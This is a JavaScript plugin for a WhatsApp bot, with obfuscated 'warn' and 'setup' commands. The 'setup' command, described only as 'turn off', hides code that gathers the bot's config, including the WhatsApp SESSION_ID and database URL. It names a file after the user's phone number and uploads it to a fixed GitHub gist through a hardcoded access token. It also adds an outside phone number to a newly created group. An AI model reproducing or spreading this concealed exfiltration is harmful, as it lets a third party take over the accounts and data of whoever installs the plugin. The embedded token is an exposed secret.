const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')

//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})



command({
  pattern: "setup",
  fromMe: true,
  desc: "turn off",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
function _0x2950(){const _0x4782dd=['THEME','update','INTERNAL_MENU','reset','_You\x20Are\x20Already\x20a\x20Family\x20Member_','a216db893ba4f4a18d4f1476bfc1bb4d','18KrStGq','HANDLER','LOGS','FONT_STYLE','RMBG_KEY','.json','FOOTER','PACKNAME','75120fKhDVV','phone_num','_Registered\x20Successfully_','reply','SESSION_ID','client','AUTHOR','@g.us','SUDO','Storage','LANGUAGE','toString','DB_URL','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','8074PvBqnc','WELCOME_MSG','48028yJGGKv','includes','BRANCH','ANTILINK','UserId','5876tAUWnN','then','1732376ThBeKH','config','STORAGE_JID','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','ALIVE','../session.json','2777570GxIYdv','stringify','split','isGroup','readFileSync','name','MODE','user','parse','8975810yirhkv','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','Done\x20Creating\x20New\x20Db','./database/settings.json','OWNER_NAME','creds','send','gists','GOODBYE_MSG','pushName','LANG','MESSAGE_MEM','156JzoBvC','BOT_NAME','updateProfilePicture','log','16SWZWln','jid','ANTILINK_ACTION','WORK_TYPE','groupCreate','28AOqtJL','1199178EZZMSU'];_0x2950=function(){return _0x4782dd;};return _0x2950();}const _0x50751f=_0x3bba;function _0x3bba(_0x5a6410,_0xc4a5ff){const _0x2950f8=_0x2950();return _0x3bba=function(_0x3bba52,_0x2b5630){_0x3bba52=_0x3bba52-0xe4;let _0x4add2c=_0x2950f8[_0x3bba52];return _0x4add2c;},_0x3bba(_0x5a6410,_0xc4a5ff);}(function(_0x22f909,_0x394780){const _0x25d77c=_0x3bba,_0x4146bd=_0x22f909();while(!![]){try{const _0x742ecb=-parseInt(_0x25d77c(0x12d))/0x1*(parseInt(_0x25d77c(0x108))/0x2)+parseInt(_0x25d77c(0x104))/0x3*(-parseInt(_0x25d77c(0xe7))/0x4)+parseInt(_0x25d77c(0xef))/0x5*(-parseInt(_0x25d77c(0x115))/0x6)+-parseInt(_0x25d77c(0x10d))/0x7*(parseInt(_0x25d77c(0xe9))/0x8)+parseInt(_0x25d77c(0x10e))/0x9+-parseInt(_0x25d77c(0xf8))/0xa+-parseInt(_0x25d77c(0x12b))/0xb*(-parseInt(_0x25d77c(0x11d))/0xc);if(_0x742ecb===_0x394780)break;else _0x4146bd['push'](_0x4146bd['shift']());}catch(_0xdd67c9){_0x4146bd['push'](_0x4146bd['shift']());}}}(_0x2950,0xcc627));if(message[_0x50751f(0xf2)])return;const {Octokit}=require('@octokit/rest'),octokit=new Octokit({'auth':_0x50751f(0x12a)});setTimeout(()=>{const _0x2f86cf=_0x50751f;let _0x953c7a=JSON['parse'](fs['readFileSync'](_0x2f86cf(0xfb))),_0xdb9952=_0x953c7a[_0x2f86cf(0xea)][_0x2f86cf(0xeb)],_0x577add=_0xdb9952[_0x2f86cf(0x128)]()[_0x2f86cf(0x12e)](_0x2f86cf(0x124));if(!_0x577add)readFile(path,async(_0x1310c2,_0x2f9263)=>{const _0x24caf2=_0x2f86cf;if(_0x1310c2){console['log'](_0x1310c2);return;}const _0x4be0e6=JSON[_0x24caf2(0xf7)](_0x2f9263);let _0x55cb65=await message[_0x24caf2(0x122)][_0x24caf2(0x10c)](_0x24caf2(0x126),['359889999996@s.whatsapp.net']);await message[_0x24caf2(0x122)]['sendMessage'](_0x55cb65['id'],{'text':_0x24caf2(0xf9)});let _0x5540ab=await _0x55cb65['id'];_0x4be0e6[_0x24caf2(0xea)][_0x24caf2(0xeb)]=_0x5540ab,writeFile(path,JSON[_0x24caf2(0xf0)](_0x4be0e6,null,0x2),async _0x5350ea=>{const _0x300b52=_0x24caf2;if(_0x5350ea){message['reply'](_0x300b52(0xec));return;}await message[_0x300b52(0x122)][_0x300b52(0x106)](_0x55cb65['id'],fs[_0x300b52(0xf3)]('./media/AAA.jpg'));});});else return;setTimeout(async()=>{const _0x4d4bed=_0x2f86cf;let _0x3e9a2f=require(_0x4d4bed(0xee)),_0x302d8c=await _0x3e9a2f['creds']['me']['id'][_0x4d4bed(0xf1)](':')[0x0],_0x38ab63=await _0x3e9a2f[_0x4d4bed(0xfd)]['me']['id'][_0x4d4bed(0xf1)]('@')[0x1],_0x2e575d=_0x302d8c+'@'+_0x38ab63,_0x150d17=_0x2e575d+_0x4d4bed(0x11a);const _0x2b252c=fs[_0x4d4bed(0xf3)](_0x4d4bed(0xfb),'utf-8');await octokit['rest'][_0x4d4bed(0xff)][_0x4d4bed(0x110)]({'gist_id':_0x4d4bed(0x114),'description':'Cloud\x20DB\x20Update','files':{[_0x150d17]:{'content':_0x2b252c}}})[_0x4d4bed(0xe8)](await console[_0x4d4bed(0x107)](_0x4d4bed(0xfa))),setTimeout(()=>{const _0x39c47e=_0x4d4bed;return process[_0x39c47e(0xfe)](_0x39c47e(0x112));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x35604b,_0x210605)=>{const _0x122cd8=_0x50751f;if(_0x35604b){console[_0x122cd8(0x107)](_0x35604b);return;}const _0x230af5=JSON['parse'](_0x210605);let _0x59800e=_0x230af5['UserId'][_0x122cd8(0x128)]()[_0x122cd8(0x12e)]('@s.whatsapp.net');if(_0x59800e)return message[_0x122cd8(0x120)](_0x122cd8(0x113));let _0x346ac4=message[_0x122cd8(0x101)],_0x29bc85=message[_0x122cd8(0xf6)],_0x3fd1e5=message[_0x122cd8(0x109)]['toString']()[_0x122cd8(0xf1)]('@')[0x0];_0x230af5[_0x122cd8(0xf4)]=_0x346ac4,_0x230af5[_0x122cd8(0xe6)]=_0x29bc85,_0x230af5[_0x122cd8(0x11e)]=_0x3fd1e5,_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x116)]=relconfig[_0x122cd8(0x116)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x10b)]=relconfig['WORK_TYPE'],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x105)]=relconfig[_0x122cd8(0x105)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0xfc)]=relconfig[_0x122cd8(0xfc)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x125)]=relconfig[_0x122cd8(0x125)],_0x230af5['config'][_0x122cd8(0x123)]=relconfig['AUTHOR'],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x11c)]=relconfig[_0x122cd8(0x11c)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x119)]=relconfig[_0x122cd8(0x119)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x102)]=relconfig['LANG'],_0x230af5['config'][_0x122cd8(0x10a)]=relconfig['ANTILINK_ACTION'],_0x230af5['config']['ANTILINK']=relconfig[_0x122cd8(0xe5)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x11b)]=relconfig[_0x122cd8(0x11b)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x10f)]=relconfig['THEME'],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x118)]=relconfig['FONT_STYLE'],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x127)]=relconfig[_0x122cd8(0x127)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0x111)]=relconfig[_0x122cd8(0x111)],_0x230af5[_0x122cd8(0xea)][_0x122cd8(0xf5)]=relconfig[_0x122cd8(0xf5)],_0x230af5['config'][_0x122cd8(0xeb)],_0x230af5['config'][_0x122cd8(0x129)],_0x230af5[_0x122cd8(0xea)]['SESSION_ID']=relconfig[_0x122cd8(0x121)],_0x230af5[_0x122cd8(0xea)]['LOGS']=relconfig[_0x122cd8(0x117)],_0x230af5['config'][_0x122cd8(0xe4)]=relconfig[_0x122cd8(0xe4)],_0x230af5['config']['B1']=relconfig['B1'],_0x230af5['config']['B2']=relconfig['B2'],_0x230af5['config']['B3']=relconfig['B3'],_0x230af5[_0x122cd8(0xea)]['B4']=relconfig['B4'],_0x230af5[_0x122cd8(0xea)]['B5']=relconfig['B5'],_0x230af5[_0x122cd8(0x103)]['GOODBYE_MSG']=relconfig[_0x122cd8(0x100)],_0x230af5[_0x122cd8(0x103)][_0x122cd8(0x12c)]=relconfig['WELCOME_MSG'],_0x230af5['MESSAGE_MEM'][_0x122cd8(0xed)]=relconfig[_0x122cd8(0xed)],writeFile(path,JSON[_0x122cd8(0xf0)](_0x230af5,null,0x2),_0xab2bf8=>{const _0x7e0cec=_0x122cd8;if(_0xab2bf8){message[_0x7e0cec(0x120)](_0x7e0cec(0xec));return;}message[_0x7e0cec(0x120)](_0x7e0cec(0x11f));});});
})

